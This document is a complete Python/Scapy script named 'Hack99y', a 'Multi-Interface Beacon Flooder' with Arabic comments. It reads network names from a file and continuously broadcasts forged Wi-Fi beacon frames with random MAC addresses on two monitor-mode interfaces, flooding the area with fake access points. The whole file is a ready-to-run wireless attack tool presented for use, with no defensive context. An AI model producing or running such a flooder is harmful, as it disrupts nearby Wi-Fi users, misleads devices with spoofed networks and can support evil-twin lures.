from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp, RandMAC
import threading
import sys
import os

# واجهة الأداة
BANNER = """
  _    _            _     ___   ___             
 | |  | |          | |   / _ \ / _ \            
 | |__| | __ _  ___| | _| (_) | (_) |_   _      
 |  __  |/ _` |/ __| |/ /> _ < \__, | | | |     
 | |  | | (_| | (__|   <| (_) |  / /| |_| |     
 |_|  |_|\__,_|\___|_|\_\\___/  /_/  \__, |     
                                      __/ |     
      [ Multi-Interface Beacon Flooder ] |___/      
"""

interfaces = ["wlan0mon", "wlan1mon"]
names_file = "names.txt"

def send_beacon(ssid, mac, iface):
    # بناء حزمة Beacon
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    frame = RadioTap()/dot11/beacon/essid
    
    # إرسال مستمر بتردد 0.1 ثانية
    sendp(frame, iface=iface, inter=0.1, loop=1, verbose=False)

def start_hack99y():
    os.system('clear')
    print(BANNER)
    
    if not os.path.exists(names_file):
        print(f"[-] Error: {names_file} not found!")
        return

    with open(names_file, "r") as f:
        ssids = [line.strip() for line in f.readlines()]

    print(f"[*] Interfaces: {', '.join(interfaces)}")
    print(f"[*] Total Networks to Create: {len(ssids)}")
    print("-" * 50)

    threads = []
    for i, ssid in enumerate(ssids):
        # توزيع آلي بين wlan0mon و wlan1mon
        iface = interfaces[i % 2] 
        mac = RandMAC()
        
        t = threading.Thread(target=send_beacon, args=(ssid, mac, iface))
        t.daemon = True
        t.start()
        threads.append(t)
    
    print(f"[!] Hack99y is running... Press Ctrl+C to stop.")
    
    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\n[!] Stopping Hack99y... Cleaning up.")
        sys.exit()

if __name__ == "__main__":
    start_hack99y()
